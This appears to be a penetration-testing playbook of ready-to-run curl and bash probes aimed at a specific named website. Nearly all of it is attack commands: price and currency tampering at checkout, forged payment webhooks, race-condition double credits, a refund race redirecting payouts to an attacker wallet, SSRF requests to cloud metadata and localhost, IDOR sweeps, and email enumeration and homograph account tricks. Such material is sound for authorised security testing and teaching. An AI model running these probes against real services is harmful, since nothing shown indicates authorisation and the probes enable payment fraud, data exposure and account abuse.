# Probe commands — business-logic invariant hunt

Copy-paste curl/bash for the canonical 20-probe set. One-time setup:

```bash
T=everlyn.ai
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
mkdir -p "/tmp/${T%%.*}_logic/raw" && cd "/tmp/${T%%.*}_logic"
```

Capture convention — every probe writes `<request>` + blank line + `<full response>`
to `raw/NN-name.txt` so REPORT.md quotes verbatim, never from memory:

```bash
probe () { # probe NN-name METHOD PATH [JSON-BODY]
  local n=$1 m=$2 p=$3 d=${4:-}
  {
    printf '$ curl -4 -si -X %s "https://%s%s" %s\n\n' "$m" "$T" "$p" "$d"
    if [ -n "$d" ]; then
      curl -4 -si -X "$m" "https://$T$p" -H "User-Agent: $UA" \
           -H 'Content-Type: application/json' --data "$d"
    else
      curl -4 -si -X "$m" "https://$T$p" -H "User-Agent: $UA"
    fi
  } | tee "raw/$n.txt"
}
```

Rules for every probe below: always `curl -4`; a 429 means sleep 20–30s and retry,
never a verdict; paste the real captured response into the report.

## 0. Recon — confirm endpoints from JS before guessing

```bash
curl -4 -s "https://$T/" -H "User-Agent: $UA" -o homepage.html
mkdir -p js
grep -oE 'src="[^"]+\.js[^"]*"' homepage.html | sed -E 's/src="([^"]+)"/\1/' | sort -u \
  | xargs -P 4 -I{} sh -c 'sleep 0.3; curl -4 -s "https://'$T'{}" -o "js/$(basename {})"'
grep -rEho '"/api/[a-zA-Z0-9/_.-]+"' js/ | tr -d '"' | sort -u > endpoints.txt
grep -rEiho 'stripe|coinbase|nowpayments|btcpay|payment_intent|checkout\.sessions|pk_(test|live)_[A-Za-z0-9]+' js/ | sort -u
```

If a `pk_test_*` key shows up, the payment stack is likely Stripe test mode — annotate
the report; do not claim real-money impact.

## 1. Endpoint mapping (run first — it scopes everything else)

```bash
for p in /api/checkout /api/stripe/checkout /api/stripe/session /api/stripe/webhook \
         /api/crypto/checkout /api/crypto/webhook /api/payment/crypto /api/checkout/crypto \
         /api/refund /api/wallet /api/register /api/share/twitter; do
  probe "map-head-$(echo "$p" | tr / _)" HEAD "$p"
  probe "map-post-$(echo "$p" | tr / _)" POST "$p" '{}'
done
```

404 = absent · 405 = exists, wrong method · 401/307-to-signin = NEEDS-AUTH ·
400/422 = exists and parses bodies (richest probe surface).

## 2. Checkout price tampering

```bash
probe p2-tamper-low POST /api/checkout '{"product_id":"pro","amount":1}'
probe p2-tamper-999 POST /api/checkout '{"product_id":"pro","amount":999,"currency":"USD"}'
probe p2-cross-plan POST /api/checkout '{"product_id":"starter","amount":9499,"currency":"USD"}'
```

EXPLOITABLE if the returned session/price echoes the client-supplied amount (server
trusted the field). BLOCKED if it recomputes from `product_id`. If `starter` at
`pro`'s price is accepted without complaint, cross-plan tampering vector.

## 3. Currency-confusion cross-replay

```bash
probe p3-cny POST /api/checkout '{"product_id":"starter","amount":7000,"currency":"CNY"}'
# capture any server-computed converted field (e.g. cn_amount), then:
probe p3-usd POST /api/checkout '{"product_id":"starter","amount":7000,"currency":"USD"}'
```

A CNY-labeled amount settling as USD amounts (~7x discount) = EXPLOITABLE.

## 4. Webhook replay, no/bogus signature

```bash
cat > raw/stripe-ev.json <<'EOF'
{"id":"evt_probe","object":"event","type":"checkout.session.completed",
 "data":{"object":{"id":"cs_test_probe","object":"checkout.session",
 "payment_intent":"pi_3Probe000000000000000000","payment_status":"paid",
 "amount_total":999,"currency":"usd",
 "metadata":{"product_id":"pro","user_id":"1"},
 "customer_email":"probe@example.com"}}}
EOF
curl -4 -si -X POST "https://$T/api/stripe/webhook" -H 'Content-Type: application/json' \
     --data @raw/stripe-ev.json | tee raw/p4-nosig.txt
curl -4 -si -X POST "https://$T/api/stripe/webhook" -H 'Content-Type: application/json' \
     -H 'Stripe-Signature: t=1,v1=AAAA' --data @raw/stripe-ev.json | tee raw/p4-badsig.txt
```

"signature verification failed" (400) = BLOCKED. 200/202 or any credited state =
EXPLOITABLE. Apply the same shape to whichever crypto webhook provider recon found.

## 5. Race double-credit — true parallelism, not serial

```bash
printf '%s\n' 1 2 3 4 5 6 7 8 | xargs -P 8 -I{} \
  curl -4 -s -X POST "https://$T/api/checkout" -H "User-Agent: $UA" \
       -H 'Content-Type: application/json' -d '{"product_id":"starter"}' \
       -o "raw/p5-race-{}.txt" -w "%{http_code} %{time_total}s\n"
# inspect raw/p5-race-*.txt: distinct session/order ids for what should be one op?
```

A serial `for` loop does not test a race. Use `xargs -P` or `cmd & cmd & wait`.

## 6. Self-referral via plus-addressing

```bash
probe p6-a1 POST /api/register '{"email":"you+1@yourdomain.tld","password":"Probe!23456","invite_code":"<own-code>"}'
probe p6-a2 POST /api/register '{"email":"you+2@yourdomain.tld","password":"Probe!23456","invite_code":"<own-code>"}'
```

## 7. Refund endpoint — unauth shape + body tampering

```bash
probe p7-refund     POST /api/refund '{"order_id":"ord_1"}'
probe p7-refund-uid POST /api/refund '{"order_id":"ord_1","user_id":"1"}'
```

401/307 = NEEDS-AUTH (record the shape for the authed retest). Anything keyed off a
body `user_id` instead of the session = candidate IDOR once authed.

## 8. Wallet-update vs refund race (authed)

```bash
curl -4 -s -X POST  "https://$T/api/refund" -H "Cookie: $SESSION" \
     -H 'Content-Type: application/json' -d '{"order_id":"<id>"}' -o raw/p8-refund.txt &
curl -4 -s -X PATCH "https://$T/api/wallet" -H "Cookie: $SESSION" \
     -H 'Content-Type: application/json' -d '{"address":"0xATTACKER..."}' -o raw/p8-patch.txt &
wait
# then read the refund record / payout destination — which wallet won?
```

## 9. Twitter share award — fake URL, SSRF, double-award race

```bash
probe p9-fake  POST /api/share/twitter '{"url":"https://twitter.com/fake/status/123","order_id":"<id>"}'
probe p9-ssrf  POST /api/share/twitter '{"url":"https://169.254.169.254/latest/meta-data/","order_id":"<id>"}'
probe p9-ssrf2 POST /api/share/twitter '{"url":"http://127.0.0.1:3000/api/user/1","order_id":"<id>"}'
printf '%s\n' 1 2 3 4 | xargs -P4 -I{} curl -4 -s -X POST "https://$T/api/share/twitter" \
  -H "Cookie: $SESSION" -H 'Content-Type: application/json' \
  -d '{"url":"<valid-tweet-url>","order_id":"<id>"}' -o "raw/p9-race-{}.txt"
```

Any sign the server fetches the URL (response timing, error text, echoed fetched
content) = SSRF surface. Two awards from the race = EXPLOITABLE.

## 10. IDOR sweeps

```bash
for i in $(seq 1 10); do probe "p10-orders-$i" GET "/api/orders/$i"; done
for i in 1 2 3 5 8 13 21 34 55 89; do probe "p10-history-$i" GET "/api/history/$i"; done
for i in 1 2 3 4 5; do probe "p10-share-$i" GET "/api/share/$i"; done
probe p10-user   GET /api/user/1
probe p10-apikey GET /api/api-keys/1
# add any admin/metrics paths surfaced in endpoints.txt
```

NextAuth targets typically 307 to `/api/auth/signin` — record as NEEDS-AUTH, not BLOCKED.

## 11. Pagination edge cases

```bash
for q in 'limit=-1' 'limit=1000000' 'offset=-1' 'page=0' 'limit=0' 'page=-1'; do
  probe "p11-$(echo "$q" | tr '=/' '--')" GET "/api/history?$q"
done
```

Negative offset still returning rows, or an unbounded limit returning the whole
table = finding. Uniform 400s = clamped correctly.

## 12. Email enumeration (message + timing)

```bash
probe p12-signin-new  POST /api/auth/signin  '{"email":"neverregistered-'"$RANDOM"'@x.com","password":"Wrong!23456"}'
probe p12-signin-real POST /api/auth/signin  '{"email":"known@target.tld","password":"Wrong!23456"}'
probe p12-reg-dup     POST /api/auth/register '{"email":"known@target.tld","password":"Probe!23456"}'
```

Distinct "user not found" vs "wrong password" (message, status, or consistent timing
gap) = enumeration vector.

## 13. Case sensitivity

```bash
L="casetest$RANDOM"
probe p13-lower POST /api/auth/register "{\"email\":\"${L}@x.com\",\"password\":\"Probe!23456\"}"
probe p13-upper POST /api/auth/register "{\"email\":\"$(echo "$L" | tr a-z A-Z)@x.com\",\"password\":\"Probe!23456\"}"
```

Duplicate accepted = account-collision vector (password resets, merged inboxes).

## 14. Unicode homograph email

Cyrillic е = U+0435 = UTF-8 `\xd0\xb5`:

```bash
H=$(printf 't\xd0\xb5st-%s@x.com' "$RANDOM")
probe p14-homo POST /api/auth/register "{\"email\":\"$H\",\"password\":\"Probe!23456\"}"
# then register the ASCII twin 'test-<n>@x.com'; if both succeed yet collide
# downstream (same canonical mailbox/record), EXPLOITABLE.
```

## 15. Numeric edge cases (negative / NaN / huge)

```bash
probe p15-neg    POST /api/video/generate '{"credits":-100}'
probe p15-nan    POST /api/video/generate '{"credits":NaN}'          # also try "NaN" as a string
probe p15-huge   POST /api/video/generate '{"credits":1e308}'
probe p15-int64  POST /api/checkout '{"product_id":"pro","amount":99999999999999999999}'
probe p15-negqty POST /api/checkout '{"product_id":"pro","quantity":-1}'
```

Silent negative balances, NaN poisoning of sums, overflow wrap, or stack-trace 500s
all go in the report with their raw captured responses.
